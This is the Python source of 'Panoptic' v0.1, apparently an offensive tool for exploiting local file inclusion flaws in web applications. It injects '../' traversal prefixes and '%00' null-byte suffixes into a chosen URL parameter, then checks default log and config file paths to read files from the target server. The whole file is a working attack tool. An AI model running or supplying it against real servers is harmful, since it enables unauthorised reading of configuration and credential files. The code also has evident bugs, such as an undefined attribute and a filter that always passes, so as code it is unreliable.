#!/usr/bin/env python

"""
Panoptic:
Search default file locations for logs and config files.
"""

import re

from urllib import urlencode
from urllib2 import urlopen, Request
from urlparse import urlsplit, parse_qsl
from optparse import OptionParser
from sys import argv, exit

NAME = "Panoptic"
VERSION = "v0.1"
URL = "https://github.com/lightos/Panoptic/"

class Panoptic:
    """
    Contains all the functionality to run panoptic.
    """
    def __init__(self):
        """
        Initiates the Panoptic object.
        """
        self.software = ""
        self.category = ""
        self.classification = ""
        self.operating_system = ""
        self.file_found = False
        self.file_attributes = {}
    
    @staticmethod
    def list_items(item):
        """
        Returns available types of categories, software or operating systems.
        """
        if item == "os":
            tmp = []
            print("Listing all available Operating Systems...\n")
        elif item == "category":
            print("Listing all available categories of software...\n")
        elif item == "software":
            print("Listing all available types of software...\n")
        else:
            print("[!] --list must be \"os\", \"software\" or \"category\"")
            exit()
        
        for file_location in open("file_locations.txt"):
            file_location = file_location.rstrip()
            if not file_location: continue
            if item == "category" and file_location[0] == "[":
                print("[+] %s" % file_location[1:-1])
            elif item == "software" and file_location[0] == "#":
                print("[+] %s" % file_location[2:])
            elif item == "os" and file_location[0] == "(":
                if file_location[1:-1] not in tmp:
                    tmp.append(file_location[1:-1])
                    
        if item == "os":
            for _ in tmp:
                print("[+] %s" % _)
                
        exit()
            
    def parse_file(self):
        """
        Parses the file locations list.
        """    
        for file_location in open("file_locations.txt"):
            if file_location[0] == "\n":
                self.software = ""
                self.classification = ""
                self.operating_system = ""
                self.file_attributes = {}
                continue
            file_location = file_location.rstrip()
            if file_location[0] == "[":
                self.category = file_location[1:-1]
                continue
            elif file_location[0] == "(":
                self.operating_system = file_location[1:-1]
                continue
            elif file_location[0] == "#":
                self.software = file_location[2:]
                continue
            elif file_location[0] == "*":
                self.classification = file_location[1:]
                continue
            elif file_location.find("{") != -1:
                # HANDLE HOST/DOMAIN replacement
                continue
            
            if self.args.software:
                if self.software.lower() != self.args.software.lower():
                    continue
            if self.args.category:
                if self.category.lower() != self.args.category.lower():
                    continue
            if self.args.classification:
                if self.classification.lower() not in [self.classification.lower(), "other"]:
                    continue
            if self.args.os:
                if self.operating_system.lower() != self.os.lower():
                    continue

            self.file_attributes["location"] = file_location
            self.file_attributes["software"] = self.software
            self.file_attributes["category"] = self.category
            self.file_attributes["classification"] = self.classification
            
            yield self.file_attributes
    
    def get_args(self):
        """
        Parse command line arguements.
        """
        examples = """
Examples:
        
./panoptic.py --url http://localhost/lfi.php?file=test.txt
./panoptic.py --url http://localhost/lfi.php?file=test.txt&id=1 --param file
./panoptic.py --url http://localhost/lfi.php --data "file=test.txt&id=1" --param file

./panoptic.py --list software
./panoptic.py --list category
./panoptic.py --list os

./panoptic.py --url http://localhost/lfi.php?file=test.txt --os Windows
./panoptic.py --url http://localhost/lfi.php?file=test.txt --software WAMP
"""
        OptionParser.format_epilog = lambda self, formatter: self.epilog  # Override epilog formatting.
        parser = OptionParser(usage="usage: %prog --url TARGET [options]", epilog=examples)
        
        # Required
        parser.add_option("-u", "--url", dest="target",
                  help="set the target to test")
        # Optional
        parser.add_option("-p", "--param", dest="param",
                  help="set the parameter to test")
        parser.add_option("-d", "--data", dest="data",
                  help="set data for POST request")
        parser.add_option("-o", "--os", dest="os",
                  help="set an operating system to limit searches to")
        parser.add_option("-s", "--software", dest="software",
                  help="set the name of the software to search for")
        parser.add_option("-c", "--category", dest="category",
                  help="set a specific category of software to look for")
        parser.add_option("-t", "--type", dest="classification",
                  help="set the type of file to search for (conf or log)")
        parser.add_option("-b", "--prefix", dest="prefix", default="",
                  help="set a prefix for file path (i.e. \"../\")")
        parser.add_option("-e", "--postfix", dest="postfix", default="",
                  help="set a prefix for file path (i.e. \"%00\")")
        parser.add_option("-m", "--multiplier", dest="multiplier", type="int", default=1,
                  help="set a number to multiply the prefix by")
        parser.add_option("-l", "--list", help="List the available filters (\"os\", \"category\", \"software\")")
        parser.add_option("-v", "--verbose", action="store_true", dest="verbose",
                          default=False, help="display extra information in the output")

        self.args = parser.parse_args()[0]

        if not self.args.target:
            parser.error('missing argument for url.')
            
        if self.args.prefix:
            self.args.prefix = self.args.prefix * self.args.multiplier

def main():
    """
    Initialize the execution of the program.
    """
    banner()
    dfl = Panoptic()
    dfl.get_args()
    parsed_url = urlsplit(dfl.args.target)
    request_params = dfl.args.data if dfl.args.data else parsed_url.query
    
    if not dfl.args.param:
        dfl.args.param = re.match("(?P<param>[^=&]+)={1}(?P<value>[^=&]+)", request_params).group(1)

    if dfl.args.data:
        request_args = {"target": "%s://%s%s" % (parsed_url.scheme, parsed_url.netloc, parsed_url.path),
                        "data": re.sub(r"(?P<param>%s)={1}(?P<value>[^=&]+)" % dfl.args.param,
                                       r"\1=%s" % "non_existing_file.panoptic", request_params)}
    else:
        request_args = {"target": "%s://%s%s?%s" % (parsed_url.scheme, parsed_url.netloc, parsed_url.path,
                                                    re.sub(r"(?P<param>%s)={1}(?P<value>[^=&]+)" % dfl.args.param,
                                                           r"\1=%s" % "non_existing_file.panoptic", request_params))}        
    dfl.invalid_response, _ = get_page(**request_args)
    
    for file in dfl.parse_file():
        if dfl.args.prefix and dfl.args.prefix[len(dfl.args.prefix)-1] == "/":
            dfl.args.prefix = dfl.args.prefix[:-1]

        if dfl.args.data:
            request_args = {"target": "%s://%s%s" % (parsed_url.scheme, parsed_url.netloc, parsed_url.path),
                            "data": re.sub(r"(?P<param>%s)={1}(?P<value>[^=&]+)" % dfl.args.param,
                                       r"\1=%s%s%s" % (dfl.args.prefix, file['location'], dfl.args.postfix), request_params)}
        else:
            request_args = {"target": "%s://%s%s?%s" % (parsed_url.scheme, parsed_url.netloc, parsed_url.path,
                                                        re.sub(r"(?P<param>%s)={1}(?P<value>[^=&]+)" % dfl.args.param,
                                                                r"\1=%s%s%s" % (dfl.args.prefix, file['location'], dfl.args.postfix), request_params))}
        html, _ = get_page(**request_args)
        
        if html != dfl.invalid_response:
            if not dfl.file_found:
                dfl.file_found = True
                print("Possible file(s) found!")
                if dfl.operating_system:
                    print("OS: %s\n" % dfl.operating_system)
            print("[+] File: %s" % dfl.file_attributes)
            
    if not dfl.file_found:
        print("No files found!")

def get_page(**kwargs):
       """
       This method retrieves the URL
       """
       url = kwargs.get("target", None)
       post = kwargs.get("data", None)
       header = kwargs.get("header", None)
       cookie = kwargs.get("cookie", None)
       proxy = kwargs.get("proxy", False)
       user_agent = kwargs.get("user_agent", None)
       verbose = kwargs.get("verbose", False)

       if url is None:
           raise Exception("[!] URL cannot be None.")

       try:
           parsed_url = urlsplit(url)
       except:
           raise Exception("[!] Unable to parse URL: %s" % url)

       if proxy:
           import socks
           import socket

           proxy = proxy.split(':')
           ip = proxy[0]
           port = proxy[1]
           socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, ip, int(port), True)
           socket.socket = socks.socksocket

       if user_agent is None:
           user_agent = {"user-agent": "%s %s" % (NAME, VERSION)}
       
       if post is None:
           url = "%s://%s%s?%s" % (parsed_url.scheme, parsed_url.netloc, parsed_url.path,
                                   urlencode(parse_qsl(parsed_url.query)))
       else:
           post = urlencode(parse_qsl(post), "POST")

       # Perform HTTP Request
       try:
           headers = user_agent
           headers["Accept"] = "*"  # Set option to add headers in cmdline
           req = Request(url, post, headers)
           conn = urlopen(req)

           # Get HTTP Response
           page = conn.read()
           code = conn.code
           status = conn.msg
           responseHeaders = conn.info()

       except IOError, e:
           if hasattr(e, "reason"):
               if verbose:
                   print("[!] Error msg: %d" % e.msg)
                   print("[!] HTTP error code: %d" % e.code)
                   print("[!] Response headers: %d" % e.info())
       
       return page, parsed_url

def banner():
    """
    Prints banner.
    
    ASCII eye taken from http://www.retrojunkie.com/asciiart/health/eyes.htm
    """
    print("""
 .-',--.`-.
<_ | () | _>
  `-`=='-'

%s %s
%s
""") % (NAME, VERSION, URL)

if __name__ == "__main__": main()
